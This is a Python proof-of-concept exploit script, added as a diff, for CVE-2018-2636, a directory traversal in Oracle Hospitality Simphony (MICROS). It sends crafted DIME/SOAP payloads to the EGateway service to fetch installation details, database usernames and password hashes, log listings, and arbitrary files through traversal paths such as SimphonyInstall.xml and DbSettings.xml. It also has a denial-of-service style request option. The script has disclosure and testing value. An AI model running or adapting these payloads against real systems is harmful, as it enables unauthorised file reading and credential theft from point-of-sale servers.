@@ -1,0 +1,197 @@
+# Exploit Title: Oracle Hospitality Simphony (MICROS) directory traversal 
+# Date: 30.01.2018
+# Exploit Author: Dmitry Chastuhin (https://twitter.com/_chipik)
+# Vendor Homepage: http://www.oracle.com/
+# Version: 2.7, 2.8 and 2.9
+# Tested on: Win, nix
+# CVE : CVE-2018-2636
+
+
+#!/usr/bin/env python
+
+# https://twitter.com/_chipik
+# Sorry for bad code practises. This is just a PoC, don't blame us very hard ¯\_(ツ)_/¯
+import requests
+import argparse
+import unicodedata
+
+
+def rm_right(str):
+    rez=""
+    k=0
+    for i in range(len(str)):
+        rez = rez + str[k:k+2]
+        k=k+4
+    return rez
+
+
+def add_right(str,char):
+    rez=""
+    k=0
+    for i in range(len(str)/2):
+        rez= rez + str[k:k+2]+char
+        k=k+2
+    return rez
+
+
+def rm_left(str):
+    rez=""
+    k=2
+    for i in range(len(str)):
+        rez = rez + str[k:k+2]
+        k=k+4
+    return rez
+
+
+def add_left(str,char):
+    rez=""
+    k=0
+    for i in range(len(str)/2):
+        rez= rez + char + str[k:k+2]
+        k=k+2
+    return rez
+
+
+def send(data,dos=0):
+    if args.verb:
+        print "[DBG] \n"+data.encode("hex")
+    if dos:
+        try:
+            r = requests.post(base_uri, headers=headers, data=data, timeout=0.001)
+        except:
+            return
+    else:
+        r = requests.post(base_uri, headers=headers, data=data)
+    if r.status_code == 200:
+        if args.verb:
+            print "[DBG] HEX:"
+            print unicodedata.normalize('NFKD', r.text).encode('ascii','ignore').encode("hex")
+            print "\n[DBG] RAW:\n"+r.text
+        print ""
+        return unicodedata.normalize('NFKD', r.text).encode('ascii','ignore')
+    else:
+        print "[DBG] status code: %d" % r.status_code
+        print "[DBG] text       : %s" % repr(r.text)
+
+
+def calculate_len(filename):
+    len2 = (len(filename)+8)/2
+    len1 = len2 + 8
+    len0 = len1 + 124
+    if args.verb:
+        print "len2="+str('{0:02x}'.format(len2))
+        print "len1="+str('{0:02x}'.format(len1))
+        print "len0="+str('{0:04x}'.format(len0))
+    return str('{0:04x}'.format(len0)),str('{0:02x}'.format(len1)),str('{0:02x}'.format(len2))
+
+
+def cli_info():
+    print "[*] Let's get info about server"
+    poc_pref='\x0c\x20\x00\x00\x00\x10\x00\x29\x00\x00\x01\x38\x55\x56\x51\x50\x70\x39\x78\x7a\x66\x69\x70\x56\x53\x6e\x4c\x75\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x78\x6d\x6c\x73\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x73\x6f\x61\x70\x2f\x65\x6e\x76\x65\x6c\x6f\x70\x65\x2f\x00\x00\x00'
+    poc_body='<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><ProcessDimeRequest xmlns=\"http://micros-hosting.com/EGateway/\" /></soap:Body></soap:Envelope>'
+    poc_suf1='\x0a\x10\x00\x00\x00\x10\x00\x18\x00\x00\x00\x84\x55\x56\x51\x50\x70\x39\x78\x7a\x66\x69\x70\x56\x53\x6e\x4c\x75\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d\x01\xe1\x1e\x02\x00\x00\x00\x36\x00\x00\x00\x3c\x00\x53\x00\x49\x00\x2d\x00\x53\x00\x65\x00\x63\x00\x75\x00\x72\x00\x69\x00\x74\x00\x79\x00\x20\x00\x56\x00\x65\x00\x72\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x3d\x00\x22\x00\x32\x00\x22\x00\x20\x00\x2f\x00\x3e\x00\x58\x52\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xc1\x1c\x01\x00\x00\x00\x01\xd1\x1d\xb8\x58\x00\x00\xb1\x36\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d\xd1\x02\x1c\xc1\x02\x1e\xe1\x02'
+    poc = poc_pref+poc_body+poc_suf1
+    full_rez = send(poc)
+    return full_rez
+
+
+def cli_dbinfo():
+    print "[*] Let's get DB creds"
+    poc_pref='\x0c\x20\x00\x00\x00\x10\x00\x29\x00\x00\x01\x38\x55\x56\x51\x50\x70\x39\x78\x7a\x66\x69\x70\x56\x53\x6e\x4c\x75\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x78\x6d\x6c\x73\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x73\x6f\x61\x70\x2f\x65\x6e\x76\x65\x6c\x6f\x70\x65\x2f\x00\x00\x00'
+    poc_body='<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><ProcessDimeRequest xmlns=\"http://micros-hosting.com/EGateway/\" /></soap:Body></soap:Envelope>'
+    poc_suf1='\x0a\x10\x00\x00\x00\x10\x00\x18\x00\x00\x00\xa0\x73\x71\x33\x49\x71\x35\x50\x54\x74\x66\x32\x6b\x42\x73\x53\x48\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d\x01\xe1\x1e\x02\x00\x00\x00\x36\x00\x00\x00\x3c\x00\x53\x00\x49\x00\x2d\x00\x53\x00\x65\x00\x63\x00\x75\x00\x72\x00\x69\x00\x74\x00\x79\x00\x20\x00\x56\x00\x65\x00\x72\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x3d\x00\x22\x00\x32\x00\x22\x00\x20\x00\x2f\x00\x3e\x00\xbd\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xc1\x1c\x01\x00\x00\x00\x01\xd1\x1d\x88\x96\x00\x00\x35\x53\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x24\x00\x00\x00\x0d\x00\x44\x62\x49\x6e\x66\x6f\x52\x65\x71\x75\x65\x73\x74\x01\x00\x00\x00\x01\x00\x06\x00\x6d\x53\x70\x61\x72\x65\x08\x00\x00\x00\x00\x00\x00\x1d\xd1\x02\x1c\xc1\x02\x1e\xe1\x02'
+    poc = poc_pref+poc_body+poc_suf1
+    full_rez = send(poc)
+    return full_rez
+
+
+def cli_log_list():
+    print "[*] Let's get log list"
+    poc = "0c200000001000290000013872663850506e79467478667275366577687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e76656c6f70652f0000003c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d227574662d38223f3e3c736f61703a456e76656c6f706520786d6c6e733a736f61703d22687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e76656c6f70652f2220786d6c6e733a7873693d22687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d612d696e7374616e63652220786d6c6e733a7873643d22687474703a2f2f7777772e77332e6f72672f323030312f584d4c536368656d61223e3c736f61703a426f64793e3c50726f6365737344696d655265717565737420786d6c6e733d22687474703a2f2f6d6963726f732d686f7374696e672e636f6d2f45476174657761792f22202f3e3c2f736f61703a426f64793e3c2f736f61703a456e76656c6f70653e0a100000001000180000008e72663850506e794674786672753665776170706c69636174696f6e2f6f637465742d73747265616d01e11e02000000360000003c00530049002d00530065006300750072006900740079002000560065007200730069006f006e003d0022003200220020002f003e00a5980000000000000000000001c11c0100000001d11d98a20000b13600000100000000000000000000001e00000012000000050000000a000000240024006c006f0067001dd1021cc1021ee1020000"
+    full_rez = send(poc.decode("hex"))
+    return full_rez
+
+
+def cli_read_log(filename):
+    log2="log\\"+filename
+    print "[*] Let's read %s" % log2
+    log = add_left(log2.encode("hex"),"00")
+    poc_pref='\x0c\x20\x00\x00\x00\x10\x00\x29\x00\x00\x01\x38\x55\x56\x51\x50\x70\x39\x78\x7a\x66\x69\x70\x56\x53\x6e\x4c\x75\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x78\x6d\x6c\x73\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x73\x6f\x61\x70\x2f\x65\x6e\x76\x65\x6c\x6f\x70\x65\x2f\x00\x00\x00'
+    poc_body='<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><ProcessDimeRequest xmlns=\"http://micros-hosting.com/EGateway/\" /></soap:Body></soap:Envelope>'
+    poc_suf_1_1='0A100000001000180000'
+    poc_suf_1_ses='66497a3263516c56444c35305045356e'
+    poc_suf_1_2='6170706C69636174696F6E2F6F637465742D73747265616D01E11E02000000360000003C00530049002D00530065006300750072006900740079002000560065007200730069006F006E003D0022003200220020002F003E00C2AF0000000000000000000001C11C0100000001D11D8EBA0000B13600000100000000000000000000001E000000'
+    poc_suf_1_len0, poc_suf_1_len1, poc_suf_1_len2 = calculate_len(log)
+    poc_suf_1_3='00000006000000'
+    poc_suf_1_4='000000240024'
+    poc_suf1=(poc_suf_1_1+poc_suf_1_len0+poc_suf_1_ses+poc_suf_1_2+poc_suf_1_len1+poc_suf_1_3+poc_suf_1_len2+poc_suf_1_4).decode("hex")
+    poc_logname = log.decode("hex")
+    if len(log2) % 2 == 1:
+        poc_suf2='001dd1021cc1021ee1020000'.decode("hex")
+    else:
+        poc_suf2='001dd1021cc1021ee102'.decode("hex")
+    poc = poc_pref+poc_body+poc_suf1+poc_logname+poc_suf2
+    full_rez = send(poc)
+    return full_rez
+
+
+def cal_tst():
+    file = "ServiceHostPrereq2012Sql\BootToDesktop.reg"
+    suf = file.encode('utf-16le')
+    print suf
+    pre = "\x0c \x00\x00\x00)\x00)\x00\x00\x04muuid:4382e7a6-607d-4392-b5df-d4b8bfcf4185\x00\x00\x00http://schemas.xmlsoap.org/soap/envelope/\x00\x00\x00"
+    xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/03/addressing\" xmlns:wsse=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:wsu=\"http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd\"><soap:Header><wsa:Action>http://micros-hosting.com/EGateway/ProcessDimeRequest</wsa:Action><wsa:MessageID>uuid:12e52d09-38dc-4071-810d-7ced9a3bfd59</wsa:MessageID><wsa:ReplyTo><wsa:Address>http://schemas.xmlsoap.org/ws/2004/03/addressing/role/anonymous</wsa:Address></wsa:ReplyTo><wsa:To>http://172.16.2.207:8080/EGateway/EGateway.asmx</wsa:To><wsse:Security><wsu:Timestamp wsu:Id=\"Timestamp-dd366974-3fbb-4e40-b868-ef9303548245\"><wsu:Created>2017-07-11T22:18:58Z</wsu:Created><wsu:Expires>2017-07-11T22:19:28Z</wsu:Expires></wsu:Timestamp></wsse:Security></soap:Header><soap:Body><ProcessDimeRequest xmlns=\"http://micros-hosting.com/EGateway/\" /></soap:Body></soap:Envelope>"
+    suf_1 = "\x00\x00\x00\x0a\x10\x00\x00\x00)\x00\x18\x00\x00\x00\xf3uuid:d9706c6f-d103-45b2-9ca2-ec588dab1c7d\x00\x00\x00application/octet-stream\x01\xe1\x1e\x02\x00\x00\x00\x00\x00\x00\x00N\x1c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xc1\x1c\x01\x00\x00\x00\x01\xd1\x1dM\x1c\x01\x00kB\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\xad\x00\x00\x00\x01\x00\x00\x002\x00\x00\x00kB\x00\x00\x00\x00\x00\x00\x03\x01\x04\x8a\x15\x00\x00\x00\x11\x00\x00\x00\x18\x00\x00\x00W\x00o\x00r\x00k\x00s\x00t\x00a\x00t\x00i\x00o\x00n\x001\x00\\\x00\x00\x00"
+    suf_2 = "\x01\xadf\xd7\x00\x00\x00\x00\x00\x17t\x00\x00\x8e\x00\x00\x00\x00\x00\x00\x00\x1d\xd1\x02\x1c\xc1\x02\x1e\xe1\x02\x00"
+    rez_S = suf_1+suf+suf_2
+    data =pre+xml+rez_S
+
+    print suf.decode('utf-16le')
+
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-H', '--host', default='127.0.0.1', help='host')
+    parser.add_argument('-P', '--port', default='8080', help='port')
+    parser.add_argument('-i', '--info', action='store_true', help='information about micros installation')
+    parser.add_argument('-d', '--dbinfo' ,action='store_true',  help='information about micros db (usernames and hashes)')
+    parser.add_argument('-l', '--log', action='store_true', help='information about log files')
+    parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
+    parser.add_argument('-r', '--read', help='read file from server (root dir is c:\\. Ex.: windows\\win.ini) Also u can use 1 - for SimphonyInstall.xml and 2 - for DbSettings.xml' )
+    parser.add_argument('-v', '--verb', action='store_true', default=0, help='verb')
+    args = parser.parse_args()
+    headers = dict()
+    if args.ssl:
+        base_uri = 'https://%s:%s%s' % (args.host, args.port, '/EGateway/EGateway.asmx')
+    else:
+        base_uri = 'http://%s:%s%s' % (args.host, args.port, '/EGateway/EGateway.asmx')
+
+    headers['SOAPAction'] = '\"http://micros-hosting.com/EGateway/ProcessDimeRequest\"'
+    headers['Content-Type']= 'application/dime'
+    headers['Expect'] = '100-continue'
+
+    if args.info:
+        results = cli_info()
+        if results.find('\x00\x55\x00\x6e\x00\x61\x00\x75\x00\x74\x00\x68\x00\x6f\x00\x72\x00\x69\x00\x7a\x00\x65\x00\x64') != -1:
+            print "[*] Your instance is not vulnerable to CVE-2018-2636"
+        else:
+            print "[!] Your instance is vulnerable to CVE-2018-2636"
+        print results
+        exit()
+    if args.dbinfo:
+        print cli_dbinfo()
+        exit()
+    if args.log:
+        print cli_log_list()
+        exit()
+    if args.read:
+        if args.read == "1":
+            print cli_read_log("..\\..\\..\\SimphonyInstall.xml")
+            exit()
+        if args.read == "2":
+            print cli_read_log("..\\DbSettings.xml")
+            exit()
+        else:
+            print cli_read_log(args.read)
+            exit()
